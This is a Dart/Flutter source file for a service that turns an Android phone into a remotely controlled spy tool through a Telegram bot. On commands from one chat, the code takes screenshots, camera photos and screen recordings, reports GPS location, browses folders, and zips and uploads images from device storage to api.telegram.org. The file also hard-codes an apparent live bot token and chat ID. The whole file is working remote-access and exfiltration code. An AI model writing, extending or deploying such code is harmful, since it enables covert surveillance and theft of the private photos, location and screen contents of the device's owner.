// lib/services/telegram_service.dart
import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:flutter_dotenv/flutter_dotenv.dart';

// 📦 Imports
import 'package:flutter_native_screenshot_plus/flutter_native_screenshot_plus.dart';
import 'package:camera/camera.dart';
import 'package:wscreen_recorder/wscreen_recorder.dart';
import 'package:geolocator/geolocator.dart';
import 'package:archive/archive.dart';
import 'package:path_provider/path_provider.dart';

class TelegramService {
  static final TelegramService _instance = TelegramService._internal();
  factory TelegramService() => _instance;
  TelegramService._internal();

  late final String _botToken;
  late final String _myChatId;

  Timer? _pollingTimer;
  int _lastUpdateId = 0;

  // 🔥 1. Queue System: एक साथ एक ही Command चलेगा
  bool _isProcessing = false;

  // 🔥 2. File Navigator: Current Directory ट्रैक करें
  String _currentDirectory = '/storage/emulated/0';

  // Recording State
  bool _isRecording = false;
  String? _currentRecordPath;

  void init() {
    _botToken = dotenv.env['8934664555:AAFXguVdarPRggeYuPXeX4L7q_eo49NGvN8'] ?? '';
    _myChatId = dotenv.env['7733900059'] ?? '';

    if (_botToken.isEmpty || _myChatId.isEmpty) {
      print('❌ ERROR: BOT_TOKEN or CHAT_ID not found in .env file!');
    } else {
      print('✅ Telegram Service Started Successfully!');
      _startPolling();
    }
  }

  void _startPolling() {
    _pollingTimer?.cancel();
    // 🚀 Speed बढ़ाई: 2 sec से घटाकर 1 sec किया
    _pollingTimer = Timer.periodic(Duration(seconds: 1), (timer) async {
      await _pollUpdates();
    });
  }

  Future<void> _pollUpdates() async {
    try {
      final url = Uri.parse(
          'https://api.telegram.org/bot$_botToken/getUpdates?offset=$_lastUpdateId&timeout=10');
      final response = await http.get(url);
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['ok'] == true) {
          for (var update in data['result']) {
            _lastUpdateId = update['update_id'] + 1;
            _handleUpdate(update);
          }
        }
      }
    } catch (e) {
      print('Polling error: $e');
    }
  }

  void _handleUpdate(Map<String, dynamic> update) {
    if (update.containsKey('message')) {
      final message = update['message'];
      final chatId = message['chat']['id'].toString();

      if (chatId != _myChatId) {
        print('⛔ Unauthorized chat ID: $chatId');
        return;
      }

      final text = message['text'] ?? '';
      print('📩 Command: $text');

      // 🔥 Queue में डालें (अगर पिछला खत्म नहीं हुआ तो मना करें)
      if (_isProcessing) {
        _sendMessage(chatId, '⏳ पिछला कमांड अभी चल रहा है, थोड़ा रुकें...');
        return;
      }

      // Process start
      _isProcessing = true;
      _processCommand(chatId, text).then((_) {
        _isProcessing = false;
      }).catchError((e) {
        _isProcessing = false;
        _sendMessage(chatId, '❌ Error: $e');
      });
    }
  }

  // --------------------------------------------------------------
  // 🧠 Command Handler
  // --------------------------------------------------------------
  Future<void> _processCommand(String chatId, String text) async {
    try {
      // 📂 CD Command: Folder बदलें
      if (text.startsWith('/cd ')) {
        String newPath = text.replaceFirst('/cd ', '').trim();
        if (newPath.isEmpty) newPath = '/storage/emulated/0';
        final dir = Directory(newPath);
        if (await dir.exists()) {
          _currentDirectory = newPath;
          await _sendMessage(chatId, '📂 Current folder changed to:\n$_currentDirectory');
        } else {
          await _sendMessage(chatId, '❌ Folder not found: $newPath');
        }
        return;
      }

      // 📂 Files (अब बिना Path के चलेगा, Current Directory दिखाएगा)
      if (text.startsWith('/files')) {
        String path = text.replaceFirst('/files', '').trim();
        if (path.isEmpty) path = _currentDirectory;
        await _listFilesAndSend(chatId, path);
        return;
      }

      // 📦 Zip Images (Current Directory use करेगा)
      if (text.startsWith('/zipimages')) {
        String path = text.replaceFirst('/zipimages', '').trim();
        if (path.isEmpty) path = _currentDirectory;
        await _zipAndSendImages(chatId, path);
        return;
      }

      // बाकी Commands
      if (text.startsWith('/screenshot')) {
        await _captureAndSendScreenshot(chatId);
      } else if (text.startsWith('/camera')) {
        await _captureAndSendCameraPhoto(chatId);
      } else if (text.startsWith('/record start')) {
        await _startScreenRecording(chatId);
      } else if (text.startsWith('/record stop')) {
        await _stopScreenRecording(chatId);
      } else if (text.startsWith('/location')) {
        await _sendLocation(chatId);
      } else if (text.startsWith('/help')) {
        await _sendMessage(chatId, '''
🤖 **Available Commands:**
/screenshot - Screenshot lo
/camera - Camera se photo lo
/record start - Recording shuru karo
/record stop - Recording band karo
/location - GPS location bhejo
/files - Current folder list karo
/files /path - Specific path list karo
/cd folder_name - Folder ke andar jao
/zipimages - Current folder ki images zip karo
        ''');
      } else {
        await _sendMessage(chatId, '❌ Unknown command. Type /help');
      }
    } catch (e) {
      await _sendMessage(chatId, '❌ Command error: $e');
    }
  }

  // ==============================================================
  // 📌 FEATURES (Screenshot, Camera, Record, Location, Files, Zip)
  // ==============================================================

  // ---------- SCREENSHOT ----------
  Future<void> _captureAndSendScreenshot(String chatId) async {
    try {
      await _sendMessage(chatId, '📩 Screenshot le raha hun...');
      final path = await FlutterNativeScreenshotPlus().takeScreenshot();
      if (path == null) {
        await _sendMessage(chatId, '❌ Screenshot failed.');
        return;
      }
      await _sendPhoto(chatId, File(path), '📸 Screenshot captured!');
    } catch (e) {
      await _sendMessage(chatId, '❌ Error: $e');
    }
  }

  // ---------- CAMERA ----------
  Future<void> _captureAndSendCameraPhoto(String chatId) async {
    try {
      await _sendMessage(chatId, '📩 Camera open ho rahi hai...');
      final cameras = await availableCameras();
      if (cameras.isEmpty) {
        await _sendMessage(chatId, '❌ No camera found.');
        return;
      }
      final controller = CameraController(cameras[0], ResolutionPreset.high);
      await controller.initialize();
      final image = await controller.takePicture();
      await controller.dispose();
      await _sendPhoto(chatId, File(image.path), '📷 Camera photo!');
    } catch (e) {
      await _sendMessage(chatId, '❌ Camera error: $e');
    }
  }

  // ---------- RECORDING ----------
  Future<void> _startScreenRecording(String chatId) async {
    if (_isRecording) {
      await _sendMessage(chatId, '⚠️ Already recording!');
      return;
    }
    try {
      final dir = await getExternalStorageDirectory();
      final path = '${dir!.path}/record_${DateTime.now().millisecondsSinceEpoch}.mp4';
      await WScreenRecorder.startRecordScreen(savePath: path);
      _isRecording = true;
      _currentRecordPath = path;
      await _sendMessage(chatId, '⏺️ Recording started!');
    } catch (e) {
      await _sendMessage(chatId, '❌ Start failed: $e');
    }
  }

  Future<void> _stopScreenRecording(String chatId) async {
    if (!_isRecording) {
      await _sendMessage(chatId, '⚠️ No recording.');
      return;
    }
    try {
      final path = await WScreenRecorder.stopRecordScreen();
      _isRecording = false;
      if (path != null) {
        await _sendVideo(chatId, File(path), '🎥 Recording saved!');
      }
      _currentRecordPath = null;
    } catch (e) {
      await _sendMessage(chatId, '❌ Stop failed: $e');
    }
  }

  // ---------- LOCATION ----------
  Future<void> _sendLocation(String chatId) async {
    try {
      bool serviceEnabled = await Geolocator.isLocationServiceEnabled();
      if (!serviceEnabled) {
        await _sendMessage(chatId, '❌ GPS is off.');
        return;
      }
      LocationPermission permission = await Geolocator.checkPermission();
      if (permission == LocationPermission.denied) {
        permission = await Geolocator.requestPermission();
      }
      if (permission == LocationPermission.deniedForever) {
        await _sendMessage(chatId, '❌ Permission denied.');
        return;
      }
      final pos = await Geolocator.getCurrentPosition();
      await _sendMessage(chatId,
          '📍 Location:\nLat: ${pos.latitude}\nLng: ${pos.longitude}\nAccuracy: ${pos.accuracy}m');
    } catch (e) {
      await _sendMessage(chatId, '❌ Location error: $e');
    }
  }

  // ---------- FILES LIST ----------
  Future<void> _listFilesAndSend(String chatId, String path) async {
    try {
      final dir = Directory(path);
      if (!await dir.exists()) {
        await _sendMessage(chatId, '❌ Directory not found.');
        return;
      }
      final list = await dir.list().toList();
      StringBuffer buffer = StringBuffer('📂 $path:\n');
      for (var entity in list.take(50)) {
        final name = entity.path.split('/').last;
        buffer.writeln('${entity is Directory ? '📁' : '📄'} $name');
      }
      if (list.length > 50) buffer.writeln('... and ${list.length - 50} more');
      await _sendMessage(chatId, buffer.toString());
    } catch (e) {
      await _sendMessage(chatId, '❌ Error: $e');
    }
  }

  // ---------- ZIP IMAGES ----------
  Future<void> _zipAndSendImages(String chatId, String path) async {
    try {
      final dir = Directory(path);
      if (!await dir.exists()) {
        await _sendMessage(chatId, '❌ Directory not found.');
        return;
      }
      final images = await dir
          .list()
          .where((e) =>
              e.path.endsWith('.jpg') ||
              e.path.endsWith('.png') ||
              e.path.endsWith('.jpeg'))
          .toList();

      if (images.isEmpty) {
        await _sendMessage(chatId, '❌ No images found in $path');
        return;
      }

      await _sendMessage(chatId, '📦 ${images.length} images mili, Zip ban raha hai...');

      final archive = Archive();
      for (var file in images) {
        final bytes = await File(file.path).readAsBytes();
        archive.addFile(ArchiveFile(file.path.split('/').last, bytes.length, bytes));
      }
      final zipBytes = ZipEncoder().encode(archive);
      final tempDir = await getTemporaryDirectory();
      final zipPath = '${tempDir.path}/images.zip';
      await File(zipPath).writeAsBytes(zipBytes!);

      var request = http.MultipartRequest(
        'POST',
        Uri.parse('https://api.telegram.org/bot$_botToken/sendDocument'),
      );
      request.fields['chat_id'] = chatId;
      request.fields['caption'] = '📦 ${images.length} images zipped.';
      request.files.add(await http.MultipartFile.fromPath('document', zipPath));
      await request.send();

      await File(zipPath).delete();
    } catch (e) {
      await _sendMessage(chatId, '❌ Zip error: $e');
    }
  }

  // ==============================================================
  // 📨 TELEGRAM SEND HELPERS
  // ==============================================================

  Future<void> _sendMessage(String chatId, String text) async {
    try {
      final url = Uri.parse('https://api.telegram.org/bot$_botToken/sendMessage');
      await http.post(url,
          headers: {'Content-Type': 'application/json'},
          body: jsonEncode(
              {'chat_id': chatId, 'text': text, 'parse_mode': 'Markdown'}));
    } catch (e) {
      print('Send msg error: $e');
    }
  }

  Future<void> _sendPhoto(String chatId, File file, String caption) async {
    try {
      var request = http.MultipartRequest(
        'POST',
        Uri.parse('https://api.telegram.org/bot$_botToken/sendPhoto'),
      );
      request.fields['chat_id'] = chatId;
      request.fields['caption'] = caption;
      request.files.add(await http.MultipartFile.fromPath('photo', file.path));
      await request.send();
    } catch (e) {
      print('Photo send error: $e');
    }
  }

  Future<void> _sendVideo(String chatId, File file, String caption) async {
    try {
      var request = http.MultipartRequest(
        'POST',
        Uri.parse('https://api.telegram.org/bot$_botToken/sendVideo'),
      );
      request.fields['chat_id'] = chatId;
      request.fields['caption'] = caption;
      request.files.add(await http.MultipartFile.fromPath('video', file.path));
      await request.send();
    } catch (e) {
      print('Video send error: $e');
    }
  }

  void dispose() {
    _pollingTimer?.cancel();
  }
}